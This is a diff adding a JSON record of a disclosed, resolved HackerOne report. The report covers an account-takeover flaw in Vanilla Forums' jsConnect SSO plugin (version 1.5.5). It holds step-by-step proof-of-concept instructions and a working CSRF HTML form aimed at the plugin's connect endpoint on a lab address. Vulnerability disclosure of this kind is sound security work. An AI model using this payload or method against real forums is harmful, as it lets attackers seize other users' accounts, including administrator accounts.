@@ -1,0 +1,157 @@
+{
+  "id": 384962,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zODQ5NjI=",
+  "url": "https://hackerone.com/reports/384962",
+  "title": "jsConnect Plugin: Takeover of existing account",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-07-21T15:03:14.450Z",
+  "submitted_at": "2018-07-21T15:03:14.450Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "foobar7",
+    "url": "/foobar7",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/197/817/efb62be6777043aba724654aa495ebeccabb9e72_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 17443,
+    "url": "https://hackerone.com/vanilla",
+    "handle": "vanilla",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Vanilla",
+      "twitter_handle": "vanilla",
+      "website": "http://vanillaforums.com",
+      "about": "Vanilla is a powerfully simple discussion forum you can easily customize to make as unique as your community."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2019-04-06T11:14:27.191Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-03-07T11:14:22.491Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Description\n-----------\n\nThe current version (1.5.5) of the official jsConnect plugin allows the takeover of an existing account that wasn't created using SSO - eg a previously existing admin user - by registering an account with the same name using SSO.\n\nA successfull attack requires one request to be issued by an authenticated administrator. This can for example take place via CSRF. Other than this, the attacker does not need any special permissions.\n\nPOC\n---\n\n1. Prerequisit: Enable jsConnect and add an SSO service (eg a local WordPress instance using the Vanilla WordPress plugin). Add a user - eg `admin` - in Vanilla, eg using `vanilla-core-2-6/dashboard/user` -> \"Add User\" (or use the admin user which was created on installation). \n2. Attacker: Register a user with the same name and an arbitrary password in the SSO service (eg WordPress).\n3. Attacker: Register with Vanilla using SSO, using the credentials from step 2. After authenticating with the SSO service, Vanilla will say that the username is already taken. Clicking on \"Connect\" will issue a POST request. The response will inform the attacker that a password is required. \n4. Attacker: Create a CSRF payload for the previous POST request and send it to an authenticated administrator.\n5. Victim Admin: Execute the CSRF payload.\n6. Attacker: Sign in using SSO. Use the credentials for the account of the SSO service created in step 2. The attacker will now have access to the account that was created in step 1, without having had access to the password for that account. \n\nExample CSRF code:\n\n    <html>\n      <body>\n        <form action=\"http://192.168.0.102/vanilla-core-2-6/entry/connect/jsconnect?client_id=test\" method=\"POST\">\n          <input type=\"hidden\" name=\"TransientKey\" value=\"\" />\n          <input type=\"hidden\" name=\"hpt\" value=\"\" />\n          <input type=\"hidden\" name=\"Target\" value=\"http&#58;&#47;&#47;192&#46;168&#46;0&#46;102&#47;vanilla&#45;core&#45;2&#45;6&#47;discussions\" />\n          <input type=\"hidden\" name=\"JsConnect\" value=\"email&#61;admin2&#37;40example&#46;com&amp;name&#61;admin2&amp;photourl&#61;http&#37;3A&#37;2F&#37;2F1&#46;gravatar&#46;com&#37;2Favatar&#37;2F7ab1e57078d6ad175c76f0c560b7688a&#37;3Fs&#37;3D96&#37;26d&#37;3Dmm&#37;26r&#37;3Dg&amp;roles&#61;subscriber&amp;uniqueid&#61;9&amp;wp&#95;nonce&#61;d79ea1a8aa&amp;client&#95;id&#61;test&amp;signature&#61;e22bcb0cb9042e6dfe2640a48afcc62c\" />\n          <input type=\"hidden\" name=\"UserSelect\" value=\"17\" />\n          <input type=\"hidden\" name=\"ConnectName\" value=\"\" />\n          <input type=\"hidden\" name=\"ConnectPassword\" value=\"\" />\n          <input type=\"hidden\" name=\"Connect\" value=\"Connect\" />\n          <input type=\"submit\" value=\"Submit request\" />\n        </form>\n      </body>\n    </html>\n\nThe values would of course need to be adapted, but are all known to the attacking user.\n\nI haven't looked into it in-depth yet, but my assumption is that the vulnerable code is actually in Vanilla core, likely in `applications/dashboard/controllers/class.entrycontroller.php:connect()`, so other functionality outside of the jsConnect plugin may be affected as well.\n\n## Impact\n\nTakeover of Vanilla account.",
+  "bounty_amount": "300.0",
+  "formatted_bounty": "$300",
+  "weakness": {
+    "id": 27,
+    "name": "Improper Authentication - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2019-04-06T11:14:22.575Z",
+  "allow_singular_disclosure_after": -153280416.19092408,
+  "singular_disclosure_allowed": true,
+  "vote_count": 35,
+  "voters": [
+    "checkm50",
+    "dewcode91",
+    "ali",
+    "savitar0x01",
+    "eveeez",
+    "lordjerry0x01",
+    "khizer47",
+    "trainr3kt",
+    "cryptographer",
+    "justbugs",
+    "and 25 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.4,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 2101,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.vanillaforums.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 15037,
+      "category": "researcher",
+      "content": "Version 1.5.5 of the Vanilla Forum single sign-on plugin \"jsConnect\" allows the takeover of any existing Vanilla Forum account that wasn't created using SSO - eg a previously existing admin user. \n\nThe attack can be performed by registering an account with the name of the account that is to be taken over with the SSO provider and linking the accounts via a specifically crafted request issued by a third account. \n\nInitially it was assumed that this third account needs administrator permissions and an attack is thus only possible with user interaction via CSRF. This assumption turned out to be false. Any registered account can be used, meaning the account takeover requires no user interaction.",
+      "user": {
+        "id": 197817,
+        "username": "foobar7",
+        "name": "Foobar7",
+        "bio": "",
+        "cleared": true,
+        "verified": true,
+        "website": null,
+        "location": "",
+        "created_at": "2017-09-06T11:46:03.184Z",
+        "url": "https://hackerone.com/foobar7",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/197/817/efb62be6777043aba724654aa495ebeccabb9e72_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/197/817/efb62be6777043aba724654aa495ebeccabb9e72_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/197/817/efb62be6777043aba724654aa495ebeccabb9e72_original.png/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": []
+    }
+  ]
+}
